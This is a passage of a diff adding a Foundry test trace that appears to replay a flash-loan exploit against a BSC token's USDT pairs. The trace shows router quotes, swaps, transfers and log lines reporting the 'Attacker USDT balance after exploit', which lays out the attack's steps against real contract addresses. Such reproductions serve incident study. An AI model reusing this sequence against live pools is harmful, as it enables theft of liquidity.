+    │   │   │   ├─ [1021] PS_ROUTER::getAmountOut(4581329753155 [4.581e12], 2818006567024 [2.818e12], 1974983638050108039907652 [1.974e24]) [staticcall]
+    │   │   │   │   └─ ← [Return] 1221653236775876789071764 [1.221e24]
+    │   │   │   ├─ [252] PS_ROUTER::factory() [staticcall]
+    │   │   │   │   └─ ← [Return] 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73
+    │   │   │   ├─ [676] 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73::getPair(USDT_TOKEN: [0x55d398326f99059fF775485246999027B3197955], 0x04C0f31C0f59496cf195d2d7F1dA908152722DE7) [staticcall]
+    │   │   │   │   └─ ← [Return] USDT_ALL_PAIR: [0x1B214e38C5e861c56e12a69b6BAA0B45eFe5C8Eb]
+    │   │   │   ├─ [893] USDT_ALL_PAIR::getReserves() [staticcall]
+    │   │   │   │   └─ ← [Return] 873025951762259966701 [8.73e20], 26752031214637250106468 [2.675e22], 1665051347 [1.665e9]
+    │   │   │   ├─ [465] USDT_ALL_PAIR::token0() [staticcall]
+    │   │   │   │   └─ ← [Return] 0x04C0f31C0f59496cf195d2d7F1dA908152722DE7
+    │   │   │   ├─ [1021] PS_ROUTER::getAmountOut(1221653236775876789071764 [1.221e24], 26752031214637250106468 [2.675e22], 873025951762259966701 [8.73e20]) [staticcall]
+    │   │   │   │   └─ ← [Return] 854272030190867572575 [8.542e20]
+    │   │   │   ├─ [6418] 0x04C0f31C0f59496cf195d2d7F1dA908152722DE7::transfer(0xe3f0C9F99BECced5197300d64ea3a814ECD862f7, 854272030190867572575 [8.542e20])
+    │   │   │   │   ├─ [439] USDT_ALL_PAIR::totalSupply() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 4475079325253002664477 [4.475e21]
+    │   │   │   │   ├─ emit Transfer(from: RES_TOKEN: [0xecCD8B08Ac3B587B7175D40Fb9C60a20990F8D21], to: 0xe3f0C9F99BECced5197300d64ea3a814ECD862f7, value: 854272030190867572575 [8.542e20])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ emit Transfer(from: 0x3F693Effc53908d517F186A20431f756C90c2229, to: USDT_RES_PAIR: [0x05ba2c512788bd95cd6D61D3109c53a14b01c82A], value: 77882605803647 [7.788e13])
+    │   │   │   ├─ emit Approval(owner: 0x3F693Effc53908d517F186A20431f756C90c2229, spender: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 115792089237316195423570985008687907853269984665640564039457583916286534576820 [1.157e77])
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [18393] USDT_RES_PAIR::swap(1905851854454828201052166 [1.905e24], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
+    │   │   │   ├─ [3271] USDT_TOKEN::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1905851854454828201052166 [1.905e24])
+    │   │   │   │   ├─ emit Transfer(from: USDT_RES_PAIR: [0x05ba2c512788bd95cd6D61D3109c53a14b01c82A], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 1905851854454828201052166 [1.905e24])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [531] USDT_TOKEN::balanceOf(USDT_RES_PAIR: [0x05ba2c512788bd95cd6D61D3109c53a14b01c82A]) [staticcall]
+    │   │   │   │   └─ ← [Return] 69131783595279838855486 [6.913e22]
+    │   │   │   ├─ [563] RES_TOKEN::balanceOf(USDT_RES_PAIR: [0x05ba2c512788bd95cd6D61D3109c53a14b01c82A]) [staticcall]
+    │   │   │   │   └─ ← [Return] 80700612370671 [8.07e13]
+    │   │   │   ├─ emit Sync(reserve0: 69131783595279838855486 [6.913e22], reserve1: 80700612370671 [8.07e13])
+    │   │   │   ├─ emit Swap(sender: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount0In: 0, amount1In: 77882605803647 [7.788e13], amount0Out: 1905851854454828201052166 [1.905e24], amount1Out: 0, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   │   └─ ← [Stop] 
+    │   │   ├─ [531] USDT_TOKEN::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   └─ ← [Return] 10220014049973500894580201 [1.022e25]
+    │   │   ├─ emit log_named_decimal_uint(key: "[FlashLoan] sell Restoken over, Attacker usdt balance is", val: 10220014049973500894580201 [1.022e25], decimals: 18)
+    │   │   ├─ [3271] USDT_TOKEN::transfer(USDT_WBNB_PAIR: [0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE], 10039256330092394234477855 [1.003e25])
+    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: USDT_WBNB_PAIR: [0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE], value: 10039256330092394234477855 [1.003e25])
+    │   │   │   └─ ← [Return] true
+    │   │   └─ ← [Stop] 
+    │   ├─ [531] USDT_TOKEN::balanceOf(USDT_WBNB_PAIR: [0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE]) [staticcall]
+    │   │   └─ ← [Return] 79425729501658818752838617 [7.942e25]
+    │   ├─ [2534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(USDT_WBNB_PAIR: [0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE]) [staticcall]
+    │   │   └─ ← [Return] 269724064594062077841614 [2.697e23]
+    │   ├─ emit Sync(reserve0: 79425729501658818752838617 [7.942e25], reserve1: 269724064594062077841614 [2.697e23])
+    │   ├─ emit Swap(sender: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount0In: 10039256330092394234477855 [1.003e25], amount1In: 0, amount0Out: 10014120886666860414836616 [1.001e25], amount1Out: 0, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   └─ ← [Stop] 
+    ├─ [531] USDT_TOKEN::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return] 180757719881106660102346 [1.807e23]
+    ├─ emit log_named_decimal_uint(key: "[End] Attacker USDT balance after exploit", val: 180757719881106660102346 [1.807e23], decimals: 18)
+    └─ ← [Stop] 
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 361.04ms (10.97ms CPU time)
+
+Ran 2 test suites in 363.40ms (646.44ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
